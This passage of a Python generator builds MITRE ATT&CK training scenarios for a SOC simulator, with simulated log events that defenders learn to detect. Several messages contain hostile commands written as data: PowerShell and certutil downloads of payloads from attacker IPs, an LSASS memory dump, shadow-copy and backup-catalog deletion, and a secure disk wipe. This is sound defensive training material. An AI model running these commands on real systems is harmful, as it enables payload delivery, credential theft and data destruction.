#!/usr/bin/env python3
"""Generate 56 MITRE ATT&CK scenario JSON files for the SOC simulator."""

import json
import os
from pathlib import Path

BASE = Path(__file__).resolve().parent.parent / "scenarios" / "mitre"

ATTACKER_IPS = ["185.234.218.42", "45.142.212.100", "103.219.189.55"]
TARGET_HOSTS = ["web-prod-01", "dc-server-01", "file-server-01", "workstation-HR-01"]

# (folder, count, tactic_id, scenarios: list of dicts)
MITRE_SCENARIOS = [
    ("reconnaissance", 3, "TA0043", [
        {"id": "01", "name": "Aktif Tarama — Port Keşfi", "technique": "T1595.001", "type": "active_scanning",
         "difficulty": "beginner", "desc": "Saldırgan hedef ağda aktif port taraması yapıyor.",
         "events": [
             {"offset": 5, "source": "firewall", "type": "scan_detected", "msg": "Port scan detected from 185.234.218.42 targeting 10.0.1.0/24 — 65535 ports in 30s", "host": "firewall-01", "ip": "185.234.218.42"},
             {"offset": 15, "source": "ids", "type": "recon_alert", "msg": "Nmap SYN scan signature detected from 185.234.218.42", "host": "firewall-01", "ip": "185.234.218.42"},
             {"offset": 30, "source": "network", "type": "connection_attempt", "msg": "Multiple SYN packets to ports 22,80,443,3389 from 185.234.218.42", "host": "web-prod-01", "ip": "185.234.218.42"},
         ]},
        {"id": "02", "name": "Kurban Host Bilgisi Toplama", "technique": "T1592.002", "type": "host_info_gathering",
         "difficulty": "beginner", "desc": "Saldırgan DNS ve WHOIS sorguları ile kurban altyapısını haritalıyor.",
         "events": [
             {"offset": 10, "source": "dns", "type": "dns_query", "msg": "Suspicious DNS enumeration: 50+ subdomain queries for targetcorp.com from 45.142.212.100", "host": "dc-server-01", "ip": "45.142.212.100"},
             {"offset": 25, "source": "network", "type": "recon", "msg": "External host 45.142.212.100 queried MX, NS, TXT records for targetcorp.com", "host": "mail-server-01", "ip": "45.142.212.100"},
         ]},
        {"id": "03", "name": "Kurban Kimlik Bilgisi Keşfi", "technique": "T1589.001", "type": "identity_gathering",
         "difficulty": "intermediate", "desc": "Saldırgan sosyal medya ve OSINT ile çalışan kimliklerini topluyor.",
         "events": [
             {"offset": 8, "source": "email", "type": "harvest_attempt", "msg": "LinkedIn scraping tool detected querying employee profiles @targetcorp.com", "host": "mail-server-01", "ip": "103.219.189.55"},
             {"offset": 20, "source": "authentication", "type": "username_enum", "msg": "Username enumeration attempt: 200 valid usernames discovered via timing attack", "host": "web-prod-01", "ip": "103.219.189.55"},
         ]},
    ]),
    ("resource_development", 2, "TA0042", [
        {"id": "01", "name": "Altyapı Edinme — Sahte Domain", "technique": "T1583.001", "type": "acquire_infrastructure",
         "difficulty": "beginner", "desc": "Saldırgan hedefi taklit eden sahte domain kaydediyor.",
         "events": [
             {"offset": 10, "source": "dns", "type": "domain_registration", "msg": "Newly registered domain targetcorp-login.com (similar to targetcorp.com) — age: 2 days", "host": "firewall-01", "ip": "185.234.218.42"},
             {"offset": 30, "source": "email", "type": "phishing_prep", "msg": "SSL certificate issued for targetcorp-login.com from Let's Encrypt", "host": "mail-server-01", "ip": None},
         ]},
        {"id": "02", "name": "Altyapı Ele Geçirme — Botnet", "technique": "T1584.005", "type": "compromise_infrastructure",
         "difficulty": "intermediate", "desc": "Saldırgan ele geçirilmiş botnet altyapısı kullanıyor.",
         "events": [
             {"offset": 5, "source": "network", "type": "botnet_c2", "msg": "Connection to known botnet C2 45.142.212.100 from internal host workstation-ENG-12", "host": "workstation-ENG-12", "ip": "45.142.212.100"},
             {"offset": 20, "source": "endpoint", "type": "malware_beacon", "msg": "Periodic beacon to 45.142.212.100:443 every 60 seconds from workstation-ENG-12", "host": "workstation-ENG-12", "ip": "45.142.212.100"},
         ]},
    ]),
    ("initial_access", 5, "TA0001", [
        {"id": "01", "name": "Oltalama — Sahte E-posta", "technique": "T1566.001", "type": "phishing",
         "difficulty": "beginner", "desc": "Saldırgan sahte IT destek e-postası ile kimlik bilgisi çalıyor.",
         "events": [
             {"offset": 10, "source": "email", "type": "phishing_email", "msg": "Suspicious email from it-support@targetcorp-login.com with credential harvest link", "host": "mail-server-01", "ip": "185.234.218.42", "user": "jsmith"},
             {"offset": 45, "source": "authentication", "type": "login_success", "msg": "User jsmith logged in from unusual location 185.234.218.42", "host": "web-prod-01", "ip": "185.234.218.42", "user": "jsmith"},
         ]},
        {"id": "02", "name": "Halka Açık Uygulama Sömürüsü", "technique": "T1190", "type": "exploit_public_app",
         "difficulty": "intermediate", "desc": "Saldırgan web uygulamasındaki SQL injection açığını sömürüyor.",
         "events": [
             {"offset": 8, "source": "web", "type": "exploit_attempt", "msg": "SQL injection attempt: ' OR 1=1-- in /api/login from 45.142.212.100", "host": "web-prod-01", "ip": "45.142.212.100"},
             {"offset": 15, "source": "web", "type": "shell_upload", "msg": "Webshell uploaded via SQLi: /uploads/shell.php from 45.142.212.100", "host": "web-prod-01", "ip": "45.142.212.100"},
         ]},
        {"id": "03", "name": "Geçerli Hesaplar — Sızıntı Parola", "technique": "T1078.004", "type": "valid_accounts",
         "difficulty": "intermediate", "desc": "Saldırgan sızdırılmış parola listesi ile VPN'e giriş yapıyor.",
         "events": [
             {"offset": 12, "source": "vpn", "type": "login_success", "msg": "VPN login success for admin@targetcorp.com from 103.219.189.55 (geo: unknown)", "host": "firewall-01", "ip": "103.219.189.55", "user": "admin"},
             {"offset": 30, "source": "authentication", "type": "privilege_use", "msg": "Admin account accessed internal resources from VPN session", "host": "dc-server-01", "ip": "103.219.189.55", "user": "admin"},
         ]},
        {"id": "04", "name": "Harici Uzaktan Erişim — RDP", "technique": "T1133", "type": "external_remote_services",
         "difficulty": "advanced", "desc": "Saldırgan internete açık RDP servisine brute force ile giriyor.",
         "events": [
             {"offset": 5, "source": "authentication", "type": "login_failure", "msg": "RDP login failure for Administrator from 185.234.218.42", "host": "workstation-FIN-01", "ip": "185.234.218.42", "user": "Administrator"},
             {"offset": 60, "source": "authentication", "type": "login_success", "msg": "RDP login success for svc_backup from 185.234.218.42", "host": "workstation-FIN-01", "ip": "185.234.218.42", "user": "svc_backup"},
         ]},
        {"id": "05", "name": "Güvenilir İlişki — Tedarikçi Erişimi", "technique": "T1199", "type": "trusted_relationship",
         "difficulty": "expert", "desc": "Saldırgan tedarikçi hesabı üzerinden iç ağa sızıyor.",
         "events": [
             {"offset": 10, "source": "authentication", "type": "login_success", "msg": "Vendor account vendor_acme logged in via partner portal from 45.142.212.100", "host": "web-prod-01", "ip": "45.142.212.100", "user": "vendor_acme"},
             {"offset": 35, "source": "network", "type": "lateral_prep", "msg": "Vendor account accessing internal file shares beyond authorized scope", "host": "file-server-01", "ip": "45.142.212.100", "user": "vendor_acme"},
         ]},
    ]),
    ("execution", 5, "TA0002", [
        {"id": "01", "name": "Komut Satırı — PowerShell", "technique": "T1059.001", "type": "powershell_execution",
         "difficulty": "beginner", "desc": "Saldırgan PowerShell ile zararlı komut çalıştırıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "process_create", "msg": "powershell.exe -enc JABjAGwA... (base64 encoded) spawned by outlook.exe", "host": "workstation-HR-01", "ip": None, "user": "jsmith"},
             {"offset": 20, "source": "endpoint", "type": "script_block", "msg": "Suspicious PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://185.234.218.42/payload.ps1')", "host": "workstation-HR-01", "ip": "185.234.218.42", "user": "jsmith"},
         ]},
        {"id": "02", "name": "İstemci Sömürüsü — Office Makro", "technique": "T1203", "type": "client_exploitation",
         "difficulty": "intermediate", "desc": "Saldırgan kötü amaçlı Office makrosu ile kod çalıştırıyor.",
         "events": [
             {"offset": 8, "source": "endpoint", "type": "macro_execution", "msg": "Excel macro enabled and executed: AutoOpen() calling Shell()", "host": "workstation-FIN-01", "ip": None, "user": "cfo"},
             {"offset": 18, "source": "endpoint", "type": "process_create", "msg": "cmd.exe spawned by WINWORD.EXE — suspicious parent-child relationship", "host": "workstation-FIN-01", "ip": None, "user": "cfo"},
         ]},
        {"id": "03", "name": "WMI — Uzaktan Komut", "technique": "T1047", "type": "wmi_execution",
         "difficulty": "intermediate", "desc": "Saldırgan WMI ile uzaktan process başlatıyor.",
         "events": [
             {"offset": 12, "source": "endpoint", "type": "wmi_event", "msg": "WMI process creation: wmiprvse.exe spawned cmd.exe on dc-server-01 from 10.0.2.21", "host": "dc-server-01", "ip": "10.0.2.21", "user": "SYSTEM"},
             {"offset": 25, "source": "network", "type": "wmi_connection", "msg": "WMI connection from workstation-FIN-01 to dc-server-01 on port 135", "host": "dc-server-01", "ip": "10.0.2.21"},
         ]},
        {"id": "04", "name": "Zamanlanmış Görev — Persistence Exec", "technique": "T1053.005", "type": "scheduled_task",
         "difficulty": "advanced", "desc": "Saldırgan schtasks ile kalıcı görev oluşturup kod çalıştırıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "task_created", "msg": "Scheduled task 'WindowsUpdateCheck' created to run C:\\Users\\Public\\update.exe daily", "host": "workstation-ENG-12", "ip": None, "user": "devuser"},
             {"offset": 22, "source": "endpoint", "type": "process_create", "msg": "update.exe executed via scheduled task WindowsUpdateCheck", "host": "workstation-ENG-12", "ip": None},
         ]},
        {"id": "05", "name": "Kullanıcı Yürütme — Sahte Yazılım", "technique": "T1204.002", "type": "user_execution",
         "difficulty": "beginner", "desc": "Kullanıcı sahte yazılım güncellemesini çalıştırıyor.",
         "events": [
             {"offset": 5, "source": "endpoint", "type": "file_download", "msg": "User downloaded ChromeUpdate.exe from http://185.234.218.42/update", "host": "workstation-HR-01", "ip": "185.234.218.42", "user": "jsmith"},
             {"offset": 15, "source": "endpoint", "type": "process_create", "msg": "ChromeUpdate.exe executed — not signed, hash matches known malware", "host": "workstation-HR-01", "ip": None, "user": "jsmith"},
         ]},
    ]),
    ("persistence", 4, "TA0003", [
        {"id": "01", "name": "Başlangıç Kaydı — Registry Run Key", "technique": "T1547.001", "type": "registry_persistence",
         "difficulty": "intermediate", "desc": "Saldırgan Run registry key ile kalıcılık sağlıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "registry_modify", "msg": "Registry modification: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate = C:\\Temp\\svc.exe", "host": "workstation-HR-01", "ip": None},
             {"offset": 25, "source": "endpoint", "type": "process_create", "msg": "svc.exe auto-started at login via Run key", "host": "workstation-HR-01", "ip": None},
         ]},
        {"id": "02", "name": "Zamanlanmış Görev Kalıcılığı", "technique": "T1053.005", "type": "scheduled_persistence",
         "difficulty": "intermediate", "desc": "Saldırgan SYSTEM yetkisiyle zamanlanmış görev oluşturuyor.",
         "events": [
             {"offset": 8, "source": "endpoint", "type": "task_created", "msg": "Scheduled task created with SYSTEM privileges: \\Microsoft\\Windows\\Maintenance\\Cleanup", "host": "dc-server-01", "ip": None, "user": "SYSTEM"},
         ]},
        {"id": "03", "name": "Hesap Oluşturma — Gizli Admin", "technique": "T1136.001", "type": "create_account",
         "difficulty": "advanced", "desc": "Saldırgan gizli yerel admin hesabı oluşturuyor.",
         "events": [
             {"offset": 12, "source": "authentication", "type": "account_created", "msg": "New local account 'support_$' created on dc-server-01", "host": "dc-server-01", "ip": None, "user": "admin"},
             {"offset": 20, "source": "authentication", "type": "group_modify", "msg": "Account support_$ added to Administrators group", "host": "dc-server-01", "ip": None},
         ]},
        {"id": "04", "name": "Windows Servisi — Kötü Amaçlı SVC", "technique": "T1543.003", "type": "service_persistence",
         "difficulty": "advanced", "desc": "Saldırgan Windows servisi olarak kalıcılık kuruyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "service_install", "msg": "New service installed: 'WindowsDefenderHelper' pointing to C:\\ProgramData\\wdhelper.exe", "host": "file-server-01", "ip": None},
             {"offset": 18, "source": "endpoint", "type": "service_start", "msg": "Service WindowsDefenderHelper started automatically", "host": "file-server-01", "ip": None},
         ]},
    ]),
    ("privilege_escalation", 4, "TA0004", [
        {"id": "01", "name": "Yerel Ayrıcalık Sömürüsü — CVE", "technique": "T1068", "type": "local_exploit",
         "difficulty": "advanced", "desc": "Saldırgan bilinen CVE ile SYSTEM yetkisi elde ediyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "exploit_attempt", "msg": "Exploit attempt detected: PrintNightmare (CVE-2021-34527) on workstation-ENG-12", "host": "workstation-ENG-12", "ip": None},
             {"offset": 22, "source": "endpoint", "type": "privilege_change", "msg": "Process escalated from user devuser to NT AUTHORITY\\SYSTEM", "host": "workstation-ENG-12", "ip": None, "user": "devuser"},
         ]},
        {"id": "02", "name": "Erişim Token Manipülasyonu", "technique": "T1134.001", "type": "token_manipulation",
         "difficulty": "expert", "desc": "Saldırgan token çalma ile yüksek yetkili process taklit ediyor.",
         "events": [
             {"offset": 12, "source": "endpoint", "type": "token_theft", "msg": "SeDebugPrivilege enabled and token duplicated from lsass.exe process", "host": "dc-server-01", "ip": None},
         ]},
        {"id": "03", "name": "Domain Admin — Kerberoasting", "technique": "T1078.002", "type": "domain_admin",
         "difficulty": "expert", "desc": "Saldırgan Kerberoasting ile domain admin hash'i elde ediyor.",
         "events": [
             {"offset": 8, "source": "authentication", "type": "kerberos_request", "msg": "Unusual volume of TGS-REQ for SPN accounts (Kerberoasting) from 10.0.2.21", "host": "dc-server-01", "ip": "10.0.2.21", "user": "svc_sql"},
             {"offset": 40, "source": "authentication", "type": "login_success", "msg": "Domain Admin login from workstation-FIN-01 using cracked service account", "host": "dc-server-01", "ip": "10.0.2.21", "user": "da_admin"},
         ]},
        {"id": "04", "name": "UAC Bypass — fodhelper", "technique": "T1548.002", "type": "uac_bypass",
         "difficulty": "advanced", "desc": "Saldırgan UAC bypass tekniği ile yükseltilmiş komut çalıştırıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "uac_bypass", "msg": "UAC bypass via fodhelper.exe registry hijack detected on workstation-HR-01", "host": "workstation-HR-01", "ip": None, "user": "jsmith"},
             {"offset": 18, "source": "endpoint", "type": "process_create", "msg": "Elevated cmd.exe spawned without UAC prompt via fodhelper bypass", "host": "workstation-HR-01", "ip": None},
         ]},
    ]),
    ("defense_evasion", 5, "TA0005", [
        {"id": "01", "name": "Güvenlik Logu Silme", "technique": "T1070.001", "type": "log_clearing",
         "difficulty": "intermediate", "desc": "Saldırgan Windows Event Loglarını temizliyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "log_cleared", "msg": "Security Event Log cleared on dc-server-01 by admin (suspicious timing)", "host": "dc-server-01", "ip": None, "user": "admin"},
         ]},
        {"id": "02", "name": "Savunmayı Engelleme — AV Devre Dışı", "technique": "T1562.001", "type": "disable_av",
         "difficulty": "advanced", "desc": "Saldırgan antivirüs ve EDR'ı devre dışı bırakıyor.",
         "events": [
             {"offset": 8, "source": "endpoint", "type": "defense_impair", "msg": "Windows Defender real-time protection disabled via PowerShell on workstation-ENG-12", "host": "workstation-ENG-12", "ip": None},
             {"offset": 15, "source": "endpoint", "type": "service_stop", "msg": "EDR agent service stopped: CrowdStrike Falcon", "host": "workstation-ENG-12", "ip": None},
         ]},
        {"id": "03", "name": "Obfuscation — Base64 Encoding", "technique": "T1027", "type": "obfuscation",
         "difficulty": "intermediate", "desc": "Saldırgan base64 ile kod gizliyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "obfuscated_script", "msg": "Highly obfuscated PowerShell script with 5 layers of base64 encoding detected", "host": "workstation-HR-01", "ip": None},
         ]},
        {"id": "04", "name": "Maskeleme — Sahte Sistem Process", "technique": "T1036.005", "type": "masquerading",
         "difficulty": "advanced", "desc": "Saldırgan svchost.exe taklit eden process çalıştırıyor.",
         "events": [
             {"offset": 12, "source": "endpoint", "type": "process_masquerade", "msg": "Process svchost.exe running from C:\\Users\\Public\\ (legitimate path: C:\\Windows\\System32\\)", "host": "file-server-01", "ip": None},
         ]},
        {"id": "05", "name": "Sistem Binary Proxy — certutil", "technique": "T1218", "type": "lolbin",
         "difficulty": "intermediate", "desc": "Saldırgan certutil ile dosya indirip çalıştırıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "lolbin_usage", "msg": "certutil.exe -urlcache -split -f http://185.234.218.42/payload.exe C:\\Temp\\payload.exe", "host": "workstation-FIN-01", "ip": "185.234.218.42"},
         ]},
    ]),
    ("credential_access", 5, "TA0006", [
        {"id": "01", "name": "SSH Brute Force", "technique": "T1110.001", "type": "brute_force",
         "difficulty": "beginner", "desc": "Saldırgan SSH servisine brute force saldırısı yapıyor.",
         "events": [
             {"offset": 10, "source": "authentication", "type": "login_failure", "msg": "Failed password for root from 185.234.218.42 port 52341 ssh2", "host": "web-prod-01", "ip": "185.234.218.42", "user": "root"},
             {"offset": 45, "source": "authentication", "type": "login_success", "msg": "Accepted password for deploy from 185.234.218.42", "host": "web-prod-01", "ip": "185.234.218.42", "user": "deploy"},
         ]},
        {"id": "02", "name": "LSASS Bellek Dökümü — Mimikatz", "technique": "T1003.001", "type": "credential_dump",
         "difficulty": "advanced", "desc": "Saldırgan Mimikatz ile LSASS bellek dökümü alıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "credential_access", "msg": "LSASS memory access detected: rundll32.exe comsvcs.dll MiniDump 688 lsass.dmp", "host": "dc-server-01", "ip": None},
             {"offset": 25, "source": "endpoint", "type": "process_create", "msg": "mimikatz.exe signature detected in process memory", "host": "dc-server-01", "ip": None},
         ]},
        {"id": "03", "name": "Tarayıcı Parola Deposu", "technique": "T1555.003", "type": "browser_credentials",
         "difficulty": "intermediate", "desc": "Saldırgan tarayıcı kayıtlı parolalarını çalıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "credential_access", "msg": "Access to Chrome Login Data and Local State files by unknown process", "host": "workstation-HR-01", "ip": None, "user": "jsmith"},
         ]},
        {"id": "04", "name": "Açıkta Kimlik Bilgisi — Config Dosyası", "technique": "T1552.001", "type": "unsecured_credentials",
         "difficulty": "beginner", "desc": "Saldırgan repoda açıkta bırakılmış parolaları buluyor.",
         "events": [
             {"offset": 8, "source": "endpoint", "type": "file_access", "msg": "Sensitive file accessed: .env containing DB_PASSWORD and API_KEY", "host": "web-prod-01", "ip": None},
         ]},
        {"id": "05", "name": "Keylogger — Girdi Yakalama", "technique": "T1056.001", "type": "keylogging",
         "difficulty": "intermediate", "desc": "Saldırgan keylogger ile tuş vuruşlarını kaydediyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "keylogger", "msg": "SetWindowsHookEx WH_KEYBOARD_LL hook installed by suspicious process", "host": "workstation-FIN-01", "ip": None, "user": "cfo"},
         ]},
    ]),
    ("discovery", 4, "TA0007", [
        {"id": "01", "name": "Ağ Servis Taraması", "technique": "T1046", "type": "network_scanning",
         "difficulty": "beginner", "desc": "Saldırgan iç ağda servis taraması yapıyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "port_scan", "msg": "Internal port scan from 10.0.2.15 to 10.0.1.0/24 ports 135,445,3389", "host": "workstation-HR-01", "ip": "10.0.2.15"},
         ]},
        {"id": "02", "name": "Grup Üyeliği Keşfi", "technique": "T1069.002", "type": "group_discovery",
         "difficulty": "intermediate", "desc": "Saldırgan domain grup üyeliklerini sorguluyor.",
         "events": [
             {"offset": 10, "source": "authentication", "type": "ldap_query", "msg": "Unusual LDAP queries: enumerating Domain Admins, Enterprise Admins groups", "host": "dc-server-01", "ip": "10.0.2.21", "user": "svc_backup"},
         ]},
        {"id": "03", "name": "Sistem Bilgisi Keşfi", "technique": "T1082", "type": "system_info",
         "difficulty": "beginner", "desc": "Saldırgan systeminfo ve hostname komutları çalıştırıyor.",
         "events": [
             {"offset": 8, "source": "endpoint", "type": "discovery_command", "msg": "systeminfo.exe, hostname.exe, whoami.exe executed in sequence", "host": "workstation-ENG-12", "ip": None, "user": "devuser"},
         ]},
        {"id": "04", "name": "Uzak Sistem Keşfi — net view", "technique": "T1018", "type": "remote_discovery",
         "difficulty": "intermediate", "desc": "Saldırgan net view ile ağ paylaşımlarını keşfediyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "discovery_command", "msg": "net view \\\\dc-server-01 and net group 'Domain Admins' /domain executed", "host": "workstation-HR-01", "ip": None, "user": "jsmith"},
         ]},
    ]),
    ("lateral_movement", 4, "TA0008", [
        {"id": "01", "name": "SMB — Pass-the-Hash", "technique": "T1021.002", "type": "smb_lateral",
         "difficulty": "advanced", "desc": "Saldırgan NTLM hash ile SMB üzerinden yan hareket yapıyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "smb_connection", "msg": "SMB authentication from 10.0.2.15 to file-server-01 using NTLM hash (no Kerberos)", "host": "file-server-01", "ip": "10.0.2.15", "user": "admin"},
             {"offset": 25, "source": "endpoint", "type": "remote_exec", "msg": "PsExec remote service creation on file-server-01 from workstation-HR-01", "host": "file-server-01", "ip": "10.0.2.15"},
         ]},
        {"id": "02", "name": "Pass-the-Ticket — Kerberos", "technique": "T1550.003", "type": "pass_the_ticket",
         "difficulty": "expert", "desc": "Saldırgan çalınmış Kerberos ticket ile lateral movement yapıyor.",
         "events": [
             {"offset": 12, "source": "authentication", "type": "kerberos_anomaly", "msg": "Kerberos TGT used from two different hosts simultaneously for admin account", "host": "dc-server-01", "ip": "10.0.2.21", "user": "admin"},
         ]},
        {"id": "03", "name": "Araç Transferi — SMB Share", "technique": "T1570", "type": "tool_transfer",
         "difficulty": "intermediate", "desc": "Saldırgan kötü amaçlı araçları SMB paylaşımına kopyalıyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "file_transfer", "msg": "Large file transfer (45MB) via SMB admin$ share from 10.0.2.15 to dc-server-01", "host": "dc-server-01", "ip": "10.0.2.15"},
         ]},
        {"id": "04", "name": "Paylaşımlı İçerik — Web Shell", "technique": "T1080", "type": "taint_shared",
         "difficulty": "advanced", "desc": "Saldırgan paylaşılan web dizinine web shell bırakıyor.",
         "events": [
             {"offset": 10, "source": "web", "type": "webshell", "msg": "PHP webshell uploaded to shared web directory /var/www/shared/", "host": "web-prod-01", "ip": "10.0.2.15"},
         ]},
    ]),
    ("collection", 3, "TA0009", [
        {"id": "01", "name": "Veri Arşivleme — 7zip", "technique": "T1560.001", "type": "archive_data",
         "difficulty": "intermediate", "desc": "Saldırgan hassas verileri arşivleyip sıkıştırıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "archive_create", "msg": "7z.exe archiving C:\\Users\\*\\Documents\\*.pdf,*.xlsx to C:\\Temp\\data.7z (2.3GB)", "host": "file-server-01", "ip": None},
         ]},
        {"id": "02", "name": "E-posta Toplama — Inbox Export", "technique": "T1114.002", "type": "email_collection",
         "difficulty": "advanced", "desc": "Saldırgan Exchange mailbox'larını toplu export ediyor.",
         "events": [
             {"offset": 10, "source": "email", "type": "mailbox_export", "msg": "Bulk mailbox export initiated for 50 users via PowerShell New-MailboxExportRequest", "host": "mail-server-01", "ip": None, "user": "admin"},
         ]},
        {"id": "03", "name": "Yerel Sistemden Veri", "technique": "T1005", "type": "local_data",
         "difficulty": "beginner", "desc": "Saldırgan yerel dosya sisteminden hassas veri topluyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "file_access", "msg": "Mass file read: 500+ files matching *.docx,*.xlsx,*.pdf in Documents folder", "host": "workstation-FIN-01", "ip": None, "user": "cfo"},
         ]},
    ]),
    ("command_and_control", 4, "TA0011", [
        {"id": "01", "name": "HTTPS C2 — Beacon", "technique": "T1071.001", "type": "https_c2",
         "difficulty": "intermediate", "desc": "Saldırgan HTTPS üzerinden C2 beacon trafiği oluşturuyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "c2_beacon", "msg": "Periodic HTTPS beacon to 185.234.218.42:443 every 60s from workstation-ENG-12", "host": "workstation-ENG-12", "ip": "185.234.218.42"},
             {"offset": 30, "source": "network", "type": "c2_beacon", "msg": "JA3 fingerprint matches known Cobalt Strike beacon", "host": "workstation-ENG-12", "ip": "185.234.218.42"},
         ]},
        {"id": "02", "name": "ICMP Tünel — Covert Channel", "technique": "T1095", "type": "icmp_c2",
         "difficulty": "advanced", "desc": "Saldırgan ICMP paketleri ile gizli C2 kanalı kuruyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "covert_channel", "msg": "Abnormal ICMP traffic: large payload packets to 45.142.212.100 every 30s", "host": "firewall-01", "ip": "45.142.212.100"},
         ]},
        {"id": "03", "name": "Araç İndirme — Ingress Transfer", "technique": "T1105", "type": "ingress_transfer",
         "difficulty": "intermediate", "desc": "Saldırgan C2 üzerinden ek araçlar indiriyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "download", "msg": "File download from C2 server: 185.234.218.42/payload2.exe (3.2MB) to workstation-HR-01", "host": "workstation-HR-01", "ip": "185.234.218.42"},
         ]},
        {"id": "04", "name": "Protokol Tünelleme — DNS Tunnel", "technique": "T1572", "type": "dns_tunnel",
         "difficulty": "expert", "desc": "Saldırgan DNS sorguları ile veri exfiltration yapıyor.",
         "events": [
             {"offset": 10, "source": "dns", "type": "dns_tunnel", "msg": "Suspicious DNS queries: high volume of TXT records to *.data.exfil.attacker.com", "host": "dc-server-01", "ip": "10.0.2.15"},
         ]},
    ]),
    ("exfiltration", 4, "TA0010", [
        {"id": "01", "name": "FTP Exfiltration", "technique": "T1048.003", "type": "ftp_exfil",
         "difficulty": "intermediate", "desc": "Saldırgan FTP ile veri dışarı aktarıyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "data_exfil", "msg": "Large FTP upload (1.8GB) from file-server-01 to 185.234.218.42:21", "host": "file-server-01", "ip": "185.234.218.42"},
         ]},
        {"id": "02", "name": "C2 Kanalı Üzerinden Exfil", "technique": "T1041", "type": "c2_exfil",
         "difficulty": "advanced", "desc": "Saldırgan mevcut C2 kanalı üzerinden veri sızdırıyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "data_exfil", "msg": "Encrypted outbound traffic spike: 500MB to 45.142.212.100 via existing C2 session", "host": "workstation-FIN-01", "ip": "45.142.212.100"},
         ]},
        {"id": "03", "name": "Otomatik Exfiltration — Script", "technique": "T1020", "type": "automated_exfil",
         "difficulty": "advanced", "desc": "Saldırgan zamanlanmış script ile otomatik veri sızdırıyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "scheduled_exfil", "msg": "Scheduled task 'BackupSync' uploading files to external cloud storage every hour", "host": "backup-server-01", "ip": "103.219.189.55"},
         ]},
        {"id": "04", "name": "Parçalı Transfer — Size Limit", "technique": "T1030", "type": "chunked_exfil",
         "difficulty": "intermediate", "desc": "Saldırgan veriyi küçük parçalar halinde sızdırıyor.",
         "events": [
             {"offset": 10, "source": "network", "type": "data_exfil", "msg": "200 small HTTPS POST requests (5MB each) to 185.234.218.42 over 2 hours", "host": "workstation-HR-01", "ip": "185.234.218.42"},
         ]},
    ]),
    ("impact", 4, "TA0040", [
        {"id": "01", "name": "Ransomware — Dosya Şifreleme", "technique": "T1486", "type": "ransomware",
         "difficulty": "advanced", "desc": "Saldırgan ransomware ile dosyaları şifreliyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "file_encrypt", "msg": "Mass file rename to .locked extension on file-server-01 — 5000+ files in 5 minutes", "host": "file-server-01", "ip": None},
             {"offset": 20, "source": "endpoint", "type": "ransom_note", "msg": "README_DECRYPT.txt dropped in every encrypted directory", "host": "file-server-01", "ip": None},
         ]},
        {"id": "02", "name": "Kurtarma Engelleme — Shadow Copy", "technique": "T1490", "type": "inhibit_recovery",
         "difficulty": "advanced", "desc": "Saldırgan shadow copy ve backup'ları siliyor.",
         "events": [
             {"offset": 8, "source": "endpoint", "type": "recovery_inhibit", "msg": "vssadmin delete shadows /all /quiet executed on backup-server-01", "host": "backup-server-01", "ip": None},
             {"offset": 15, "source": "endpoint", "type": "recovery_inhibit", "msg": "wbadmin delete catalog -quiet executed", "host": "backup-server-01", "ip": None},
         ]},
        {"id": "03", "name": "Veri Yıkımı — Disk Wipe", "technique": "T1485", "type": "data_destruction",
         "difficulty": "expert", "desc": "Saldırgan disk üzerindeki verileri kalıcı olarak siliyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "data_destruction", "msg": "SDelete -p 7 executed on C:\\Users\\*\\Documents\\ — secure wipe in progress", "host": "workstation-FIN-01", "ip": None},
         ]},
        {"id": "04", "name": "Endpoint DoS — CPU Exhaustion", "technique": "T1499.004", "type": "endpoint_dos",
         "difficulty": "intermediate", "desc": "Saldırgan CPU kaynaklarını tüketerek servisi engelliyor.",
         "events": [
             {"offset": 10, "source": "endpoint", "type": "resource_exhaustion", "msg": "CPU at 100% for 30 minutes — cryptominer process xmrig.exe detected", "host": "web-prod-01", "ip": None},
         ]},
    ]),
]


def build_scenario(folder, tactic_id, spec):
    events = []
    for ev in spec["events"]:
        events.append({
            "offset_secs": ev["offset"],
            "source": ev["source"],
            "event_type": ev["type"],
            "message": ev["msg"],
            "host": ev["host"],
            "source_ip": ev.get("ip"),
            "destination_ip": ev.get("dest_ip"),
            "user": ev.get("user"),
            "is_malicious": True,
            "mitre_technique": spec["technique"],
        })

    tactic_slug = folder.replace("_", "-")
    sid = f"mitre-{folder}-{spec['id']}"

    return {
        "id": sid,
        "name": spec["name"],
        "difficulty": spec["difficulty"],
        "category": folder,
        "mitre_tactic": tactic_id,
        "mitre_tactic_name": folder.replace("_", " ").title(),
        "description": spec["desc"],
        "objective": f"Bu {spec['name']} senaryosunda saldırıyı tespit edin, MITRE tekniği {spec['technique']} ile ilişkilendirin ve müdahale edin.",
        "time_limit_secs": 1800,
        "scenario_type": spec["type"],
        "target_hosts": TARGET_HOSTS[:3],
        "attacker_ips": ATTACKER_IPS,
        "events": events,
        "expected_actions": ["acknowledge", "investigate", "contain", "block_ip"],
        "hints": [
            f"MITRE Tekniği: {spec['technique']}",
            f"Taktik: {tactic_id}",
            "Olay zaman çizelgesini inceleyin",
